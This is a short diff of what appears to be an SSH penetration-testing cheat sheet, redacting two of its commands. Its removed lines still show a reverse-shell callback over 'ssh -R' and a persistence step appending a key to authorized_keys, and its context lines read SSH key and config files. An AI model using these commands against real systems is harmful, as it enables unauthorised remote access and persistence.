@@ -255,7 +255,7 @@ ssh -R 8080:localhost:80 user@192.168.1.100
 # Remote can access via localhost:8080
 
 # Reverse shell callback
-ssh -R 4444:localhost:4444 user@192.168.1.100
+ssh -R [REDACTED_SSH_REVERSE_SHELL_PAYLOAD]:localhost:[REDACTED_PORT] user@192.168.1.100
 ```
 
 #### Dynamic Port Forwarding (SOCKS Proxy)
@@ -312,7 +312,7 @@ cat ~/.ssh/known_hosts
 cat ~/.ssh/authorized_keys
 
 # Add persistence (add your key)
-echo "ssh-rsa AAAAB3..." >> ~/.ssh/authorized_keys
+echo "[REDACTED_SSH_AUTHORIZED_KEYS_PERSISTENCE]" >> ~/.ssh/authorized_keys
 
 # Extract SSH configuration
 cat /etc/ssh/sshd_config
